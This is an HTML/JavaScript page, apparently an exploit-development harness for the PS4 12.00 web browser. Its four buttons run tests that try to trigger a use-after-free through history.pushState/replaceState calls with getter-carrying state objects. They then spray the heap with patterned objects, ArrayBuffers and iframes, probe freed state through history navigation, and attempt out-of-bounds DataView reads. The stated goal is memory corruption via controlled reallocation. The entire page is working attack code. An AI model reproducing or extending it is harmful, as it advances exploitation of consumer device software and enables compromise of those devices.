<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - Heap Feng Shui for UAF</title>
</head>
<body>
<h2>PS4 12.00 - UAF Heap Reallocation Control</h2>
<p>Status: <span id="status">Ready</span></p>

<button onclick="testHeapSprayRealloc()">TEST 1 - Heap Spray Reallocation</button>
<button onclick="testObjectReplacement()">TEST 2 - Object Replacement</button>
<button onclick="testStructureIDConfusion()">TEST 3 - StructureID Confusion</button>
<button onclick="testDirectMemoryAccess()">TEST 4 - Direct Memory Pattern</button>

<pre id="log"></pre>

<script>
const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");

function log(m){ 
  logEl.textContent += m + "\n";
  logEl.scrollTop = logEl.scrollHeight;
}
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

var keepAlive = [];

const BASE = 977;
const STEP = 14461;
const UAF_ITERS = 48;

// =====================================================
// TEST 1 - Heap Spray Reallocation
// =====================================================
async function testHeapSprayRealloc(){
  logEl.textContent = "";
  keepAlive = [];
  statusEl.textContent = "Test 1 Running...";
  
  log("=== TEST 1: Heap Spray Reallocation ===\n");
  log("Strategy: Spray heap with controlled objects during UAF window\n");
  
  log("[SETUP] Preparing victim and spray objects");
  
  // Victim will be freed during UAF
  let victimArray = new Uint32Array(64);
  for(let i=0; i<64; i++) {
    victimArray[i] = 0xDEAD0000 + i;
  }
  
  log("  Victim: Uint32Array[64]\n");
  
  let spraySuccess = false;
  let corruptedData = [];
  let size = BASE;
  
  log("[PHASE 1] UAF with aggressive heap spray");
  
  for(let i=0; i<UAF_ITERS; i++){
    let state = {
      index: i,
      victim: victimArray,
      
      get spray() {
        if(i >= 44) { // Start spraying early
          log(`  OK ITER ${i}`);
          
          // AGGRESSIVE SPRAY: Create many objects to fill freed slots
          let sprayObjects = [];
          
          for(let j=0; j<200; j++) {
            // Create objects with controlled pattern
            let obj = {
              magic: 0x41424344,
              index: i * 1000 + j,
              buffer: new Uint32Array(64)
            };
            
            // Fill buffer with recognizable pattern
            for(let k=0; k<64; k++) {
              obj.buffer[k] = 0xBEEF0000 + k;
            }
            
            sprayObjects.push(obj);
          }
          
          log(`    Sprayed 200 objects`);
          
          // NOW check victim - it might point to spray data
          try {
            let victimVal0 = this.victim[0];
            let victimVal1 = this.victim[1];
            
            log(`    victim[0] = 0x${victimVal0.toString(16)}`);
            log(`    victim[1] = 0x${victimVal1.toString(16)}`);
            
            // Check if victim was overwritten by spray
            if(victimVal0 !== 0xDEAD0000) {
              log(`    OK Victim corrupted! Expected 0xDEAD0000, got 0x${victimVal0.toString(16)}`);
              spraySuccess = true;
              corruptedData.push({iter: i, idx: 0, val: victimVal0});
            }
            
            // Check for spray pattern (0xBEEF00XX)
            for(let k=0; k<64; k++) {
              let val = this.victim[k];
              if((val & 0xFFFF0000) === 0xBEEF0000) {
                log(`    OK SPRAY PATTERN at victim[${k}] = 0x${val.toString(16)}`);
                spraySuccess = true;
                corruptedData.push({iter: i, idx: k, val: val});
              }
            }
            
          } catch(e) {
            log(`    Exception checking victim: ${e.message}`);
          }
          
          keepAlive.push(...sprayObjects);
        }
        return "spray_" + i;
      }
    };
    
    let frag = "S".repeat(size);
    
    history.pushState(state, "", "#" + frag);
    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
    
    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
    if(i % 10 === 0) log(`  ITER ${i}: size=${size}`);
    
    size += STEP;
    await sleep(5);
  }
  
  log("\n[PHASE 2] UAF complete\n");
  await sleep(120);
  
  log("[PHASE 3] Heap grooming");
  let frames = [];
  for(let i=0; i<80; i++){
    let f = document.createElement("iframe");
    document.body.appendChild(f);
    try {
      let d = f.contentDocument;
      d.open();
      d.write("<html><body>G</body></html>");
      d.close();
    } catch(e){}
    frames.push(f);
  }
  frames.forEach(f=>f.remove());
  await sleep(80);
  
  log("\n[RESULTS]");
  log(`Spray success: ${spraySuccess}`);
  log(`Corrupted data points: ${corruptedData.length}`);
  
  if(corruptedData.length > 0) {
    log("\nOK Corrupted data:");
    for(let d of corruptedData.slice(0, 10)) {
      log(`  ITER ${d.iter} victim[${d.idx}] = 0x${d.val.toString(16)}`);
    }
    log("\nOK OK Heap spray reallocation successful");
    statusEl.textContent = "TEST 1 SUCCESS";
  } else {
    log("\nFAIL No heap corruption detected");
    statusEl.textContent = "TEST 1 FAILED";
  }
  
  log("\n=== TEST 1 END ===");
}

// =====================================================
// TEST 2 - Object Replacement
// =====================================================
async function testObjectReplacement(){
  logEl.textContent = "";
  keepAlive = [];
  statusEl.textContent = "Test 2 Running...";
  
  log("=== TEST 2: Object Replacement ===\n");
  log("Strategy: Replace freed object with controlled structure\n");
  
  log("[SETUP] Creating victim object");
  
  let victimObj = {
    type: "victim",
    data: [1, 2, 3, 4, 5],
    marker: 0xCAFEBABE
  };
  
  log("  Victim object created\n");
  
  let replaced = false;
  let replacementData = [];
  let size = BASE;
  
  log("[PHASE 1] UAF with object replacement");
  
  for(let i=0; i<UAF_ITERS; i++){
    let state = {
      index: i,
      victim: victimObj,
      
      get replace() {
        if(i >= 45) {
          log(`  OK ITER ${i}`);
          
          // Create replacement objects with same size
          let replacements = [];
          
          for(let j=0; j<150; j++) {
            let replacement = {
              type: "replacement",
              data: [0xBEEF, 0xCAFE, 0xDEAD, 0xBEEF, 0xFACE],
              marker: 0xDEADBEEF,
              index: j
            };
            replacements.push(replacement);
          }
          
          log(`    Created 150 replacement objects`);
          
          // Check if victim was replaced
          try {
            let victimType = this.victim.type;
            let victimMarker = this.victim.marker;
            let victimData0 = this.victim.data[0];
            
            log(`    victim.type: ${victimType}`);
            log(`    victim.marker: 0x${victimMarker.toString(16)}`);
            log(`    victim.data[0]: 0x${victimData0.toString(16)}`);
            
            if(victimType !== "victim") {
              log(`    OK Type changed from victim to ${victimType}`);
              replaced = true;
              replacementData.push({iter: i, type: victimType});
            }
            
            if(victimMarker !== 0xCAFEBABE) {
              log(`    OK Marker changed to 0x${victimMarker.toString(16)}`);
              replaced = true;
              replacementData.push({iter: i, marker: victimMarker});
            }
            
            if(victimData0 !== 1 && victimData0 === 0xBEEF) {
              log(`    OK Data replaced with spray pattern`);
              replaced = true;
              replacementData.push({iter: i, data: victimData0});
            }
            
          } catch(e) {
            log(`    Exception: ${e.message}`);
          }
          
          keepAlive.push(...replacements);
        }
        return "replace_" + i;
      }
    };
    
    let frag = "R".repeat(size);
    
    history.pushState(state, "", "#" + frag);
    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
    
    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
    if(i % 10 === 0) log(`  ITER ${i}: size=${size}`);
    
    size += STEP;
    await sleep(5);
  }
  
  log("\n[PHASE 2] UAF complete\n");
  await sleep(120);
  
  log("[PHASE 3] Heap grooming");
  let frames = [];
  for(let i=0; i<80; i++){
    let f = document.createElement("iframe");
    document.body.appendChild(f);
    try {
      let d = f.contentDocument;
      d.open();
      d.write("<html><body>G</body></html>");
      d.close();
    } catch(e){}
    frames.push(f);
  }
  frames.forEach(f=>f.remove());
  await sleep(80);
  
  log("\n[RESULTS]");
  log(`Replacement: ${replaced}`);
  log(`Replacement data: ${replacementData.length}`);
  
  if(replacementData.length > 0) {
    log("\nOK Replacement evidence:");
    for(let r of replacementData) {
      log(`  ${JSON.stringify(r)}`);
    }
    log("\nOK OK Object replacement successful");
    statusEl.textContent = "TEST 2 SUCCESS";
  } else {
    log("\nFAIL No replacement detected");
    statusEl.textContent = "TEST 2 FAILED";
  }
  
  log("\n=== TEST 2 END ===");
}

// =====================================================
// TEST 3 - StructureID Confusion
// =====================================================
async function testStructureIDConfusion(){
  logEl.textContent = "";
  keepAlive = [];
  statusEl.textContent = "Test 3 Running...";
  
  log("=== TEST 3: StructureID Confusion ===\n");
  log("Strategy: Navigate history to access freed state objects\n");
  
  log("[SETUP] Creating states with different types");
  
  let confusionDetected = false;
  let confusionCases = [];
  let size = BASE;
  
  log("[PHASE 1] UAF with navigation-based confusion");
  
  for(let i=0; i<UAF_ITERS; i++){
    // Create state with mixed types
    let state = {
      index: i,
      arrayData: new Uint32Array(32),
      objectData: {x: i, y: i*2},
      primitiveData: i * 0x1000,
      
      get confuse() {
        if(i >= 46) {
          log(`  OK ITER ${i} history.length=${history.length}`);
          
          // Navigate backward to access old (potentially freed) states
          if(history.length > 10) {
            try {
              // Go back 5 states
              for(let j=0; j<5; j++) {
                history.back();
              }
              
              // Access old state (might be freed)
              if(history.state) {
                let oldIndex = history.state.index;
                let oldArray = history.state.arrayData;
                let oldObject = history.state.objectData;
                let oldPrimitive = history.state.primitiveData;
                
                log(`    Accessed old state index=${oldIndex}`);
                
                // Check for corruption
                if(oldArray && oldArray.length !== 32) {
                  log(`    OK Array length corrupted: ${oldArray.length}`);
                  confusionDetected = true;
                }
                
                if(oldObject && (oldObject.x !== oldIndex || oldObject.y !== oldIndex*2)) {
                  log(`    OK Object data corrupted`);
                  confusionDetected = true;
                  confusionCases.push({type: 'object', index: oldIndex});
                }
                
                if(oldPrimitive && oldPrimitive !== oldIndex * 0x1000) {
                  log(`    OK Primitive corrupted: 0x${oldPrimitive.toString(16)}`);
                  confusionDetected = true;
                  confusionCases.push({type: 'primitive', val: oldPrimitive});
                }
                
                // Try to read from old array
                if(oldArray) {
                  for(let k=0; k<10; k++) {
                    let val = oldArray[k];
                    if(val !== undefined && val !== 0) {
                      log(`    oldArray[${k}] = 0x${val.toString(16)}`);
                    }
                  }
                }
              }
              
              // Navigate forward again
              for(let j=0; j<5; j++) {
                history.forward();
              }
              
            } catch(e) {
              log(`    Exception during navigation: ${e.message}`);
            }
          }
        }
        return "nav_" + i;
      }
    };
    
    // Initialize array with pattern
    for(let j=0; j<32; j++) {
      state.arrayData[j] = 0xAAAA0000 + (i * 32 + j);
    }
    
    let frag = "N".repeat(size);
    
    history.pushState(state, "", "#" + frag);
    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
    
    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
    if(i % 10 === 0) log(`  ITER ${i}: size=${size}`);
    
    size += STEP;
    await sleep(5);
  }
  
  log("\n[PHASE 2] UAF complete\n");
  await sleep(120);
  
  log("[PHASE 3] Final navigation check");
  
  for(let i=0; i<10; i++) {
    history.back();
    await sleep(30);
    
    if(history.state) {
      let idx = history.state.index;
      let arr = history.state.arrayData;
      
      log(`  Back ${i}: index=${idx}`);
      
      if(arr) {
        let val0 = arr[0];
        let expected = 0xAAAA0000 + (idx * 32);
        
        if(val0 !== expected) {
          log(`    OK Corruption: arr[0]=0x${val0.toString(16)} expected=0x${expected.toString(16)}`);
          confusionDetected = true;
          confusionCases.push({nav: i, index: idx, val: val0});
        }
      }
    }
  }
  
  log("\n[RESULTS]");
  log(`Confusion detected: ${confusionDetected}`);
  log(`Confusion cases: ${confusionCases.length}`);
  
  if(confusionCases.length > 0) {
    log("\nOK Confusion cases:");
    for(let c of confusionCases.slice(0, 10)) {
      log(`  ${JSON.stringify(c)}`);
    }
    log("\nOK OK Navigation confusion successful");
    statusEl.textContent = "TEST 3 SUCCESS";
  } else {
    log("\nFAIL No confusion via navigation");
    statusEl.textContent = "TEST 3 FAILED";
  }
  
  log("\n=== TEST 3 END ===");
}

// =====================================================
// TEST 4 - Direct Memory Pattern
// =====================================================
async function testDirectMemoryAccess(){
  logEl.textContent = "";
  keepAlive = [];
  statusEl.textContent = "Test 4 Running...";
  
  log("=== TEST 4: Direct Memory Pattern Access ===\n");
  log("Strategy: Use DataView to access raw bytes during UAF\n");
  
  log("[SETUP] Creating buffers with patterns");
  
  let victimBuf = new ArrayBuffer(1024);
  let victimView = new DataView(victimBuf);
  
  // Write recognizable pattern
  for(let i=0; i<256; i++) {
    victimView.setUint32(i*4, 0xDEAD0000 + i, true);
  }
  
  log("  Victim buffer: 1024 bytes with pattern\n");
  
  let memoryAccess = false;
  let accessedData = [];
  let size = BASE;
  
  log("[PHASE 1] UAF with direct memory access");
  
  for(let i=0; i<UAF_ITERS; i++){
    let state = {
      index: i,
      buf: victimBuf,
      view: victimView,
      
      get access() {
        if(i >= 45) {
          log(`  OK ITER ${i}`);
          
          // Spray with new buffers
          let sprayBufs = [];
          for(let j=0; j<100; j++) {
            let buf = new ArrayBuffer(1024);
            let view = new DataView(buf);
            
            for(let k=0; k<256; k++) {
              view.setUint32(k*4, 0xBEEF0000 + k, true);
            }
            
            sprayBufs.push(buf);
          }
          
          log(`    Sprayed 100 buffers`);
          
          // Try to read from victim
          try {
            // Read first 16 DWORDs
            for(let j=0; j<16; j++) {
              let val = this.view.getUint32(j*4, true);
              let expected = 0xDEAD0000 + j;
              
              if(j < 3) {
                log(`    victim[${j}] = 0x${val.toString(16)}`);
              }
              
              if(val !== expected) {
                log(`    OK Memory changed at offset ${j*4}: 0x${val.toString(16)}`);
                memoryAccess = true;
                accessedData.push({offset: j*4, val: val, expected: expected});
              }
            }
            
            // Try to read beyond original size
            try {
              for(let j=256; j<270; j++) {
                let val = this.view.getUint32(j*4, true);
                if(val !== undefined) {
                  log(`    OK OOB read at offset ${j*4}: 0x${val.toString(16)}`);
                  memoryAccess = true;
                  accessedData.push({offset: j*4, val: val, oob: true});
                }
              }
            } catch(e) {
              // Expected
            }
            
          } catch(e) {
            log(`    Exception: ${e.message}`);
          }
          
          keepAlive.push(...sprayBufs);
        }
        return "memory_" + i;
      }
    };
    
    let frag = "M".repeat(size);
    
    history.pushState(state, "", "#" + frag);
    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
    
    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
    if(i % 10 === 0) log(`  ITER ${i}: size=${size}`);
    
    size += STEP;
    await sleep(5);
  }
  
  log("\n[PHASE 2] UAF complete\n");
  await sleep(120);
  
  log("[PHASE 3] Heap grooming");
  let frames = [];
  for(let i=0; i<80; i++){
    let f = document.createElement("iframe");
    document.body.appendChild(f);
    try {
      let d = f.contentDocument;
      d.open();
      d.write("<html><body>G</body></html>");
      d.close();
    } catch(e){}
    frames.push(f);
  }
  frames.forEach(f=>f.remove());
  await sleep(80);
  
  log("\n[RESULTS]");
  log(`Memory access: ${memoryAccess}`);
  log(`Accessed data: ${accessedData.length}`);
  
  if(accessedData.length > 0) {
    log("\nOK Memory access data:");
    for(let d of accessedData.slice(0, 15)) {
      let oobStr = d.oob ? " OOB" : "";
      log(`  offset ${d.offset}: 0x${d.val.toString(16)}${oobStr}`);
    }
    log("\nOK OK Direct memory access successful");
    statusEl.textContent = "TEST 4 SUCCESS";
  } else {
    log("\nFAIL No memory access detected");
    statusEl.textContent = "TEST 4 FAILED";
  }
  
  log("\n=== TEST 4 END ===");
}

log("PS4 12.00 - Heap Feng Shui for UAF Exploitation");
log("\n4 tests targeting heap reallocation:");
log("\n1. Heap Spray - Aggressive object spray during UAF");
log("2. Object Replacement - Replace freed objects");
log("3. Navigation Confusion - Access freed states via history");
log("4. Direct Memory - DataView access during UAF");
log("\nGoal: Achieve memory corruption via controlled reallocation");
</script>
</body>
</html>
